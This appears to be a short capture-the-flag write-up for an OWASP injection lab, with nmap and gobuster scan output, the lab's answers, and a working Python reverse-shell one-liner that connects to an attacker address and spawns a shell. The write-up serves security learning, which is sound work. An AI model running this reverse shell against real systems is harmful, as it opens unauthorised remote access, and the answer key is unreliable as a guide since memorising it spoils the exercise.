# Injection - owasp top 10

```
export IP=10.10.253.224
```

- As usual, i'm some recon(nmap scan). Want to know the services running on the machine before i start thinking about what to do with it.
Results from nmap scan.
```
Starting Nmap 7.70 ( https://nmap.org ) at 2020-07-13 23:42 GMT                                      
Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                      
SYN Stealth Scan Timing: About 99.99% done; ETC: 23:43 (0:00:00 remaining)                           
Nmap scan report for 10.10.253.224
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                    
| ssh-hostkey:
|   2048 cc:44:30:82:07:0e:5d:1d:9a:2f:9e:c7:c5:58:78:c8 (RSA)                                       
|   256 73:70:7a:38:45:76:cb:77:ee:bd:a7:a0:b7:33:72:1d (ECDSA)                                      
|_  256 cc:3e:1a:08:c1:40:7a:3a:c4:52:65:3f:64:f0:c9:95 (ED25519)                                    
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                                  
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: !!WIP!! - Directory Search
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                              

Service detection perfo	rmed. Please report any incorrect results at https://nmap.org/submit/ .       
Nmap done: 1 IP address (1 host up) scanned in 124.99 seconds                                        

```


- Now a gobuster scan to detect some common directories.
Didn't bring back anything useful :(.

```

=====================================================                                                
Gobuster v2.0.1              OJ Reeves (@TheColonial)                                                
=====================================================                                                
[+] Mode         : dir
[+] Url/Domain   : http://10.10.253.224:80/
[+] Threads      : 10
[+] Wordlist     : /opt/wordlist/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================                                                
2020/07/13 23:58:14 Starting gobuster
=====================================================                                                
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
=====================================================                                                
2020/07/14 00:00:16 Finished
=====================================================                                                

```

- python reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.29.246",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

1. What strange text file is in the website root directory?
```
drpepper.txt
```

2. How many non-root/non-service/non-daemon users are there?
```
0
```

3. What user is this app running as?
```
www-data
```

4. What is the user's shell set as?
```
/usr/sbin/nologin
```

